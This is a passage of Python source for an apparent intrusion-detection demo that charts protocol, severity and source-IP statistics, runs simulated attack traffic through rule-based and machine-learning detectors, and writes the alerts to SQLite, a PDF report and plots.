    proto_counts = [p[1] for p in proto_data]
    if not proto_counts:
        proto_labels, proto_counts = ["TCP", "UDP", "HTTP", "DNS"], [40, 25, 20, 15]

    alert_data = db.query(Alert.severity, func.count(Alert.id)).group_by(Alert.severity).all()
    alert_labels = [a[0] for a in alert_data]
    alert_counts = [a[1] for a in alert_data]
    if not alert_counts:
        alert_labels, alert_counts = ["CRITICAL", "HIGH", "MEDIUM"], [5, 12, 8]

    top_hosts = db.query(Alert.source_ip, func.count(Alert.id)).group_by(Alert.source_ip).order_by(func.count(Alert.id).desc()).limit(5).all()
    host_ips = [h[0] for h in top_hosts] if top_hosts else ["185.220.101.5", "45.33.32.156", "198.51.100.4"]
    host_counts = [h[1] for h in top_hosts] if top_hosts else [14, 10, 6]

    fig, axs = plt.subplots(2, 2, figsize=(14, 10))
    fig.patch.set_facecolor('#0f172a')
    for ax in axs.flat:
        ax.set_facecolor('#1e293b')
        ax.tick_params(colors='#94a3b8')
        ax.xaxis.label.set_color('#94a3b8')
        ax.yaxis.label.set_color('#94a3b8')
        for spine in ax.spines.values():
            spine.set_color('#334155')

    # Plot 1: Protocol Distribution (Bar)
    axs[0, 0].bar(proto_labels, proto_counts, color='#38bdf8', edgecolor='#0284c7')
    axs[0, 0].set_title("Network Protocol Breakdown", color='#f8fafc', fontsize=12, fontweight='bold')
    axs[0, 0].set_ylabel("Packets Count")

    # Plot 2: Threat Alert Severity (Pie)
    sev_colors = {'CRITICAL': '#ef4444', 'HIGH': '#f59e0b', 'MEDIUM': '#3b82f6', 'LOW': '#10b981'}
    colors_list = [sev_colors.get(lbl, '#64748b') for lbl in alert_labels]
    axs[0, 1].pie(alert_counts, labels=alert_labels, colors=colors_list, autopct='%1.1f%%', textprops={'color': '#f8fafc'})
    axs[0, 1].set_title("Threat Severity Categorization", color='#f8fafc', fontsize=12, fontweight='bold')

    # Plot 3: Top Malicious Origin IPs (Horizontal Bar)
    axs[1, 0].barh(host_ips, host_counts, color='#f43f5e', edgecolor='#be123c')
    axs[1, 0].set_title("Top Malicious Origin Sources", color='#f8fafc', fontsize=12, fontweight='bold')
    axs[1, 0].set_xlabel("Alert Incident Frequency")

    # Plot 4: Packet Size Distribution Histogram
    lengths = [p[0] for p in db.query(PacketLog.length).limit(300).all()]
    if not lengths:
        lengths = list(np.random.normal(loc=500, scale=200, size=150).clip(64, 1500))
    axs[1, 1].hist(lengths, bins=15, color='#a855f7', edgecolor='#7e22ce', alpha=0.8)
    axs[1, 1].set_title("Packet Size Distribution (Bytes)", color='#f8fafc', fontsize=12, fontweight='bold')
    axs[1, 1].set_xlabel("Length (Bytes)")
    axs[1, 1].set_ylabel("Frequency")

    plt.tight_layout()
    plt.savefig(output_image, dpi=200, facecolor=fig.get_facecolor(), edgecolor='none')
    plt.close()
    print(f"[+] Security analytics visualization saved: {output_image}")


# ======================================================================================
# SECTION 12: MAIN DEMONSTRATION & VERIFICATION PIPELINE
# ======================================================================================
def run_complete_demonstration():
    """Executes the complete IDS pipeline and prints formatted verification logs."""
    print("=" * 80)
    print("[*] CyberSentinel IDS & Packet Analysis System -- Standalone Engine")
    print("=" * 80)

    db = SessionLocal()
    init_default_admin(db)
    print("[+] Database Initialized: SQLite schema and default admin verified.")

    rule_engine = RuleEngine()
    anomaly_detector = AnomalyDetector()

    print("[+] Packet Engines Online: Signature Rule Engine & Isolation Forest ready.")
    print("[+] Simulating real-time network traffic & injecting cyber attack scenarios...\n")

    captured_packets = []

    # 1. Generate legitimate background traffic
    for _ in range(40):
        pkt = TrafficSimulator.generate_normal_packet()
        captured_packets.append(pkt)

    # 2. Inject deliberate multi-vector attacks
    attack_vectors = ["PORT_SCAN", "SYN_FLOOD", "SQLI", "BRUTE_FORCE", "XSS"]
    for atk in attack_vectors:
        atk_pkts = TrafficSimulator.generate_attack_scenario(atk)
        captured_packets.extend(atk_pkts)

    # 3. Process every packet through the IDS pipeline
    alerts_generated = []
    for pkt in captured_packets:
        # Save to DB
        p_db = PacketLog(
            source_ip=pkt["source_ip"],
            dest_ip=pkt["dest_ip"],
            source_port=pkt["source_port"],
            dest_port=pkt["dest_port"],
            protocol=pkt["protocol"],
            length=pkt["length"],
            flags=pkt["flags"],
            info=pkt["info"]
        )
        db.add(p_db)

        # Run Rule-based Signature Detection
        rule_alerts = rule_engine.inspect(pkt)
        for a in rule_alerts:
            alerts_generated.append(a)
            db.add(Alert(**a))

        # Run ML Anomaly Detection
        anom_alert = anomaly_detector.inspect(pkt)
        if anom_alert:
            alerts_generated.append(anom_alert)
            db.add(Alert(**anom_alert))

    db.commit()

    # 4. Display Results in Terminal
    print(f"[*] Processed {len(captured_packets)} Packets | Triggered {len(alerts_generated)} Security Alerts\n")

    print("-" * 80)
    print(f"{'SEVERITY':<10} | {'RULE NAME':<25} | {'ATTACKER SOURCE':<18} | {'GEO ORIGIN'}")
    print("-" * 80)
    for alert in alerts_generated[:12]:
        sev = alert["severity"]
        name = alert["rule_name"]
        src = alert["source_ip"]
        country = alert["country"]
        print(f"{sev:<10} | {name:<25} | {src:<18} | {country}")
    print("-" * 80)

    # 5. Generate Forensic PDF Report
    pdf_path = "cybersentinel_security_report.pdf"
    generate_pdf_report(db, pdf_path)
    print(f"[+] Forensic Audit PDF generated successfully: {pdf_path}")

    # 6. Generate Analytics Plots
    img_path = "ids_traffic_analysis.png"
    generate_forensic_plots(db, img_path)

    # Print Key Database Telemetry
    total_pkts = db.query(PacketLog).count()
    total_alrts = db.query(Alert).count()
    print("\n" + "=" * 80)
    print("[+] FINAL SYSTEM TELEMETRY SUMMARY:")
    print(f"   * Total Logged Packets : {total_pkts}")
    print(f"   * Total Logged Threats : {total_alrts}")
    print(f"   * Critical Alerts      : {db.query(Alert).filter(Alert.severity == 'CRITICAL').count()}")
    print(f"   * High / Warning Alerts: {db.query(Alert).filter(Alert.severity == 'HIGH').count()}")
    print("   * Export Artifacts     : PDF Report, SQLite Database, Analytics Plots")
    print("=" * 80 + "\n")

    db.close()


if __name__ == "__main__":
    run_complete_demonstration()
